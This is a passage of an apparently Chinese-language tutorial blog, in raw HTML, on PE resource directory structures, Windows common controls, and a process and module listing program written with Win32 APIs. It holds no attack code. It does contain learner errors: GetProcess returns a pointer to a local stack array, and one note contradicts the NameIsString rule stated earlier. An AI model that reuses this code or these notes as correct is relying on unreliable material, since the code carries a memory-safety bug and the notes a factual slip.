class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//资源目录</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Characteristics;\t\t\t\t\t\t<span class=\"comment\">//资源属性  保留 0\t\t</span></span><br><span class=\"line\">    DWORD   TimeDateStamp;\t\t\t\t\t\t<span class=\"comment\">//资源创建的时间\t\t</span></span><br><span class=\"line\">    WORD    MajorVersion;\t\t\t\t\t\t<span class=\"comment\">//资源版本号 未使用 0\t\t</span></span><br><span class=\"line\">    WORD    MinorVersion;\t\t\t\t\t\t<span class=\"comment\">//资源版本号 未使用 0\t\t</span></span><br><span class=\"line\">    WORD    NumberOfNamedEntries;\t\t\t\t\t\t<span class=\"comment\">//以名称命名的资源数量\t\t</span></span><br><span class=\"line\">    WORD    NumberOfIdEntries;\t\t\t\t\t\t<span class=\"comment\">//以ID命名的资源数量\t\t</span></span><br><span class=\"line\"><span class=\"comment\">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//资源目录项：\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span>\t\t\t\t\t\t<span class=\"comment\">//目录项的名称、或者ID\t\t</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">            DWORD NameOffset:<span class=\"number\">31</span>;\t\t\t\t<span class=\"comment\">// :称为位域，低位31位\t位的精确控制</span></span><br><span class=\"line\">            DWORD NameIsString:<span class=\"number\">1</span>;\t\t\t\t<span class=\"comment\">// 第32位\t\t\t\t</span></span><br><span class=\"line\">        &#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">        DWORD   Name;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">        WORD    Id;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    &#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">        DWORD   OffsetToData;\t\t\t\t\t\t<span class=\"comment\">//目录项指针\t\t</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">            DWORD   OffsetToDirectory:<span class=\"number\">31</span>;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">            DWORD   DataIsDirectory:<span class=\"number\">1</span>;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">        &#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    &#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">// 第一层 用于判断资源类型，光标，位图...一共有16种类型</span></span><br><span class=\"line\"><span class=\"comment\">// :位域/位段   </span></span><br><span class=\"line\"><span class=\"comment\">// 第二层name代表资源编号</span></span><br><span class=\"line\"><span class=\"comment\">// 第三层代表代码页</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//数据项：\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_DATA_DIRECTORY</span> &#123;</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   VirtualAddress;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Size;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>位段或者位域的作用：</p>\n<blockquote>\n<p>对位的精确控制</p>\n<p>不使用位域需要 name &amp; 0x80000000 == 0x80000000 判断最高位是 1</p>\n<p>存在位域时可以直接判断 NameIsString</p>\n</blockquote>\n<p>NameIsString = 0，name 低 31 位是编号，int 类型的编号</p>\n<p>NameIsString = 1，name 低 31 位是指针，指向 Unicode 字符串</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NameIsString==<span class=\"number\">1</span>，低<span class=\"number\">31</span>位指向结构:</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> _IMAGE_RESOURCE_DIR_STRING_U &#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">    WORD    Length;\t\t\t\t\t\t\t</span><br><span class=\"line\">    WCHAR   NameString[ <span class=\"number\">1</span> ];\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125; IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U;\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">NameIsString==<span class=\"number\">1</span>,低<span class=\"number\">31</span>位是ID</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x\\n&quot;</span>,(pResourceEntry[i].Name &amp; <span class=\"number\">0x80000000</span>) == <span class=\"number\">0x80000000</span>);\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x\\n&quot;</span>,pResourceEntry[i].NameIsString == <span class=\"number\">1</span>);\t\t\t\t\t\t\t\t</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OffsetToData的含义：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">最高位如果为1，低31位 + 资源地址 == 下一层目录节点的起始位置\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"通用控件\"><a class=\"markdownIt-Anchor\" href=\"#通用控件\">#</a> 通用控件</h3>\n<table>\n<thead>\n<tr>\n<th>Windows 标准控件，标准控件总是可用的:</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td></td>\n</tr>\n<tr>\n<td>Static</td>\n</tr>\n<tr>\n<td>Group Box</td>\n</tr>\n<tr>\n<td>Button</td>\n</tr>\n<tr>\n<td>Check Box</td>\n</tr>\n<tr>\n<td>Radio Button</td>\n</tr>\n<tr>\n<td>Edit</td>\n</tr>\n<tr>\n<td>ComboBox</td>\n</tr>\n<tr>\n<td>ListBox</td>\n</tr>\n</tbody>\n</table>\n<p>Windows 通用控件，代码包含在 Comctrl32.dll</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;commctrl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(lib,<span class=\"string\">&quot;comctl32.lib&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\">INITCOMMONCONTROLSEX icex;\t\t\t\t</span><br><span class=\"line\">icex.dwSize = <span class=\"keyword\">sizeof</span>(INITCOMMONCONTROLSEX);\t\t\t\t</span><br><span class=\"line\">icex.dwICC = ICC_WIN95_CLASSES;\t\t\t\t</span><br><span class=\"line\">InitCommonControlsEx(&amp;icex);\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;resource.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;commctrl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(lib,<span class=\"string\">&quot;comctl32.lib&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">PrintModules</span><span class=\"params\">( DWORD processID )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HMODULE hMods[<span class=\"number\">1024</span>];</span><br><span class=\"line\">    HANDLE hProcess;</span><br><span class=\"line\">    DWORD cbNeeded;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Print the process identifier.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>( <span class=\"string\">&quot;\\nProcess ID: %u\\n&quot;</span>, processID );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get a handle to the process.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |</span><br><span class=\"line\">                            PROCESS_VM_READ,</span><br><span class=\"line\">                            FALSE, processID );</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"literal\">NULL</span> == hProcess)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">// Get a list of all the modules in this process.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( EnumProcessModules(hProcess, hMods, <span class=\"keyword\">sizeof</span>(hMods), &amp;cbNeeded))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; (cbNeeded / <span class=\"keyword\">sizeof</span>(HMODULE)); i++ )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            TCHAR szModName[MAX_PATH];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Get the full path to the module&#x27;s file.</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( GetModuleFileNameEx( hProcess, hMods[i], szModName,</span><br><span class=\"line\">                                      <span class=\"keyword\">sizeof</span>(szModName) / <span class=\"keyword\">sizeof</span>(TCHAR)))</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Print the module name and handle value.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                _tprintf( TEXT(<span class=\"string\">&quot;\\t%s (0x%08X)\\n&quot;</span>), szModName, hMods[i] );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// Release the handle to the process.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    CloseHandle( hProcess );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD cProcesses;</span><br><span class=\"line\">DWORD* <span class=\"title function_\">GetProcess</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD aProcesses[<span class=\"number\">1024</span>]; </span><br><span class=\"line\">    DWORD cbNeeded; </span><br><span class=\"line\">    <span class=\"comment\">//unsigned int i;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get the list of process identifiers.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !EnumProcesses( aProcesses, <span class=\"keyword\">sizeof</span>(aProcesses), &amp;cbNeeded ) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Calculate how many process identifiers were returned.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    cProcesses = cbNeeded / <span class=\"keyword\">sizeof</span>(DWORD);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Print the names of the modules for each process.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//for ( i = 0; i &lt; cProcesses; i++ )</span></span><br><span class=\"line\">    <span class=\"comment\">//&#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//    PrintModules( aProcesses[i] );</span></span><br><span class=\"line\">    <span class=\"comment\">//&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> aProcesses;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">EnumProccess</span><span class=\"params\">(HWND hListProcess)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLV_ITEM vitem;\t</span><br><span class=\"line\">\tDWORD* aProcesses = GetProcess();</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//初始化\t\t\t\t\t</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;vitem,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(LV_ITEM));\t\t\t\t\t</span><br><span class=\"line\">\tvitem.mask = LVIF_TEXT;\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 1\t\t\t</span></span><br><span class=\"line\">\tvitem.pszText = <span class=\"string\">&quot;csrss.exe&quot;</span>;\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iItem = <span class=\"number\">0</span>;\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iSubItem = <span class=\"number\">0</span>;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//ListView_InsertItem(hListProcess, &amp;vitem);\t\t\t\t\t</span></span><br><span class=\"line\">\tSendMessage(hListProcess, LVM_INSERTITEM,<span class=\"number\">0</span>,(DWORD)&amp;vitem);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\tvitem.pszText = TEXT(<span class=\"string\">&quot;448&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iItem = <span class=\"number\">0</span>;\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iSubItem = <span class=\"number\">1</span>;\t\t\t\t\t</span><br><span class=\"line\">\tListView_SetItem(hListProcess, &amp;vitem);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\tvitem.pszText = TEXT(<span class=\"string\">&quot;56590000&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iItem = <span class=\"number\">0</span>;\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iSubItem = <span class=\"number\">2</span>;\t\t\t\t\t</span><br><span class=\"line\">\tListView_SetItem(hListProcess, &amp;vitem);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\tvitem.pszText = TEXT(<span class=\"string\">&quot;000F0000&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iItem = <span class=\"number\">0</span>;\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iSubItem = <span class=\"number\">3</span>;\t\t\t\t\t</span><br><span class=\"line\">\tListView_SetItem(hListProcess, &amp;vitem);\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tvitem.pszText = TEXT(<span class=\"string\">&quot;winlogon.exe&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iItem = <span class=\"number\">1</span>;\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iSubItem = <span class=\"number\">0</span>;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//ListView_InsertItem(hListProcess, &amp;vitem);\t\t\t\t\t</span></span><br><span class=\"line\">\tSendMessage(hListProcess, LVM_INSERTITEM,<span class=\"number\">0</span>,(DWORD)&amp;vitem);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\tvitem.pszText = TEXT(<span class=\"string\">&quot;456&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iSubItem = <span class=\"number\">1</span>;\t\t\t\t\t</span><br><span class=\"line\">\tListView_SetItem(hListProcess, &amp;vitem);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\tvitem.pszText = TEXT(<span class=\"string\">&quot;10000000&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iSubItem = <span class=\"number\">2</span>;\t\t\t\t\t</span><br><span class=\"line\">\tListView_SetItem(hListProcess, &amp;vitem);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\tvitem.pszText = TEXT(<span class=\"string\">&quot;000045800&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tvitem.iSubItem = <span class=\"number\">3</span>;\t\t\t\t\t</span><br><span class=\"line\">\tListView_SetItem(hListProcess, &amp;vitem);\t\t\t</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">EnumModules</span><span class=\"params\">(HWND hListProcess,WPARAM wParam,LPARAM lParam)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//MessageBox(0,0,0,0);</span></span><br><span class=\"line\">\tDWORD dwRowId;</span><br><span class=\"line\">\tTCHAR szPid[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">\tLV_ITEM lv;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//初始化</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;lv,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(LV_ITEM));</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(szPid,<span class=\"number\">0</span>,<span class=\"number\">0x20</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//获取选择行</span></span><br><span class=\"line\">\tdwRowId = SendMessage(hListProcess,LVM_GETNEXTITEM,<span class=\"number\">-1</span>,LVNI_SELECTED);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(dwRowId == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tMessageBox(<span class=\"literal\">NULL</span>,TEXT(<span class=\"string\">&quot;选择进程&quot;</span>),TEXT(<span class=\"string\">&quot;出错啦&quot;</span>),MB_OK);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//获取PID</span></span><br><span 